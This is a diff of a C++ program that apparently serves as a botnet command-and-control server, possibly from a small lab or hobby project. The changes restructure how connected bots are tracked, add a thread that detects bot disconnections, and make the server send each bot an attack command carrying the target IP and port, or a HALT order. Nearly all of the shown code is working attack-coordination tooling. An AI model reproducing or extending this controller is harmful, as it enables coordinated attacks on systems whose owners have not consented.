@@ -15,21 +15,22 @@ using namespace std;
 bool start = false;
 bool server_started = false;
 
-char* attack = "None";
-string target_ip;
+string attack = "None";
+string target_ip = "None";
 
-vector<string> bots;
 thread tListener;
 vector<thread> threads;
-int target_port;
+int target_port = 0;
 int server_fd, valread, client_socket;
 struct sockaddr_in server_address, client_address;
-struct netbot_status {
+struct netbot {
 	int id;
 	bool start;
+	string ip_address;
 };
 
-vector<netbot_status> netbots_statuses;
+vector<netbot> netbots;
+string message;
 
 void setup_target_parameters()
 {	
@@ -71,17 +72,17 @@ void menu_header()
 
 void list_bots()
 {
-	cout << "Bots connected " << "(" << bots.size() <<"):\n";
-	vector<string>::iterator iter = bots.begin();
+	cout << "Bots connected " << "(" << netbots.size() <<"):\n";
+	vector<netbot>::iterator iter = netbots.begin();
 
-	for(iter; iter < bots.end(); iter++) 
+	for(iter; iter < netbots.end(); iter++) 
 	{
-		cout << "bot: " << *iter << "\n";
+		cout << "bot: " << (*iter).ip_address << "\n";
 	}
 
 	cout << endl;
 
-	sleep(5);
+	sleep(3);
 }
 
 void setup_attack_type()
@@ -137,54 +138,89 @@ void setup_attack_type()
 
 }
 
+void disconnection_listener(int i)
+{	
+	char buffer[1024] = { 0 };
+	while(true)
+	{
+		bzero(&buffer, sizeof(buffer));
+		int bytes = recv(i, buffer, 1024, 0);	
+
+		if (bytes == 0) // netbot disconnected
+		{	
+			vector<netbot>::iterator iter = netbots.begin();
+			for(iter; iter < netbots.end(); iter++) 
+			{
+				if ((*iter).id == i) 
+				{
+					netbots.erase(iter);
+					iter--;
+				}
+			}
+			
+			close(i);
+			return;
+		}
+	}
+}
+
 void threaded(int i)
 {
 	char buffer[1024] = { 0 };	
 	cout << "\nClient Socket File Descriptor: " << i << "\n";
 	
 	bzero(&buffer, sizeof(buffer));
-	int bytes = recv(i, buffer, 1024, 0);
-	// valread = read(i, buffer, 1024);
-        
-        if (bytes == 0) 
-        {
-        	close(i);
-        	return;
-        }
-        
+	int bytes = recv(i, buffer, 1024, 0);	
+	
+	thread dListener = thread(disconnection_listener, i);
+	dListener.detach();
+
 	while (1)
-	{
-		netbot_status bot;
+	{		
+		netbot bot;
 	
 		if (start == true) 
-		{
-			vector<netbot_status>::iterator iter = netbots_statuses.begin();
-			for(iter; iter < netbots_statuses.end(); iter++) 
+		{	
+			bool found = false;
+			vector<netbot>::iterator iter = netbots.begin();
+			for(iter; iter < netbots.end(); iter++) 
 			{
 				if ((*iter).id == i) 
-				{
+				{	
+					found = true;
 					bot = *iter;
 					break;				
 				}
 			}
 			
+			if (!found) {
+				close(i);
+				return;
+			}
+			
 			bot.start = true;
 		}
 
-		if (attack != "None" && bot.start == true)
-	       	{
-			send(i, attack, strlen(attack), 0);
+		if (attack != "None" && target_ip != "None" && target_port != 0 && bot.start == true)
+	       	{	
+	       		if (attack == "HALT") {
+	       			message = attack;
+	       		} else {
+	       			message = attack + "_" + target_ip + "_" + to_string(target_port);
+	       		}
+	       			
+			send(i, message.c_str(), strlen(message.c_str()), 0);
 			cout << "Server attack sent\n";
 			sleep(1);
 			bot.start = false;
 			start = false;
-		}
+		} 
 	}	
 }
 
 void connection_listener(int i)
 {
-	while(bots.size() != 3)
+	while(netbots.size() != 3)
 	{
 		socklen_t client_length = sizeof(client_address);
 		if ((client_socket = accept(server_fd, (struct sockaddr *) &client_address, &client_length)) < 0) {
@@ -192,10 +228,9 @@ void connection_listener(int i)
 			exit(EXIT_FAILURE);
 		}
 
-		bots.push_back(inet_ntoa(client_address.sin_addr));
-		netbots_statuses.push_back({ client_socket, false });
+		netbots.push_back({ client_socket, false, inet_ntoa(client_address.sin_addr) });
 	
-		cout << "\nclient connected: " << inet_ntoa(client_address.sin_addr) << "\t Total Bots Connected: " << bots.size() << endl;
+		cout << "\nclient connected: " << inet_ntoa(client_address.sin_addr) << "\t Total Bots Connected: " << netbots.size() << endl;
 
 		threads.push_back(thread(threaded, client_socket));
   		threads.back().detach();
